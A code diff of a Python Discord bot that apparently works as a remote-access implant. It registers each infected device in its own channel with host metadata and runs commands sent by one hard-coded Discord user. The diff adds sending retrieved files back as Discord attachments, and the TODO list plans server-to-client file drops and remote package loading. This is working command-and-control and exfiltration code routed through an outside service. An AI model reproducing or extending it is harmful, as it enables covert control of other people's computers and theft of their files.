@@ -25,9 +25,7 @@ JSON_FORMAT_PREFIX = "```json\n"
 
 """
 TODO: Interesting stuff to add:
-- Support for larger message processing
 - Put file from server to client
-- With get files, have them go as attachments to the server
 - A way to load third-party python packages.
   e.g. request from the server, and drop the wheel to disk, and then import.
 - Find a standard library way to bootstrap. Currently we require a few different 3p packages.
@@ -192,16 +190,13 @@ def execute_command(cmd_str):
 
 def get_content(upload):
     """
-        upload_id : GUID of upload from server
-        upload_str : path to retrieve for upload
+        upload: full path to the file to retrieve
     """
     try:
         # Reads whole file into memory;
         # may not work well with large files
         p = Path(upload)
-        with p.open("rb") as f:
-            data = f.read()
-            return data
+        return discord.File(upload, filename=p.name)
 
     except FileNotFoundError as e:
         return e
@@ -209,16 +204,23 @@ def get_content(upload):
         return e
     except OSError as e:
         return e
+    except Exception as e:
+        return e
 
 def do_exit():
     exit()
 
-async def send_long_message(channel, text, prefix="```", suffix="```"):
-    """Split long text into <=2000 char chunks and send sequentially."""
-    max_length = 2000 - len(prefix) - len(suffix)
-    for i in range(0, len(text), max_length):
-        chunk = text[i:i+max_length]
-        await channel.send(f"{prefix}{chunk}{suffix}")
+async def send_message_wrapper(channel, output, is_file=False, prefix="```", suffix="```"):
+    if is_file:
+        content = "📎 See attachment:"
+        await channel.send(content=content, file=output)
+
+    else:
+        """Split long text into <=2000 char chunks and send sequentially."""
+        max_length = 2000 - len(prefix) - len(suffix)
+        for i in range(0, len(output), max_length):
+            chunk = output[i:i+max_length]
+            await channel.send(f"{prefix}{chunk}{suffix}")
 
 # Runs after Bot() object is created
 @bot.event
@@ -236,11 +238,7 @@ async def on_ready():
         if not existing:
             new_channel = await guild.create_text_channel(channel_name)
             await new_channel.send("📡 New device checked in!")
-
-            # Trying with new send_long_message
-            await send_long_message(new_channel, metadata_pretty, prefix=JSON_FORMAT_PREFIX)
-            
-            # await new_channel.send(metadata_pretty)
+            await send_message_wrapper(new_channel, metadata_pretty, prefix=JSON_FORMAT_PREFIX)
 
             CHECKIN_CHANNELS.add(channel_name)
             LOCKFILE.write_text(str(channel_name), encoding="utf-8")
@@ -248,7 +246,7 @@ async def on_ready():
         else:
             CHECKIN_CHANNELS.add(channel_name)
             await existing.send("📡 Device has checked in again!")
-            await send_long_message(existing, metadata_pretty, prefix=JSON_FORMAT_PREFIX)
+            await send_message_wrapper(existing, metadata_pretty, prefix=JSON_FORMAT_PREFIX)
 
 # Runs when a message is seen in any of its channels
 @bot.event
@@ -263,9 +261,11 @@ async def on_message(message):
 
     if(message.author.id == 558898662772572160):
         output = process_command(message.content)
-        # await message.channel.send(output)
 
-        await send_long_message(message.channel, output)
+        if isinstance(output, discord.File):
+            await send_message_wrapper(message.channel, output, is_file=True)
+        else:
+            await send_message_wrapper(message.channel, output)
 
 if __name__ == "__main__":
     main()
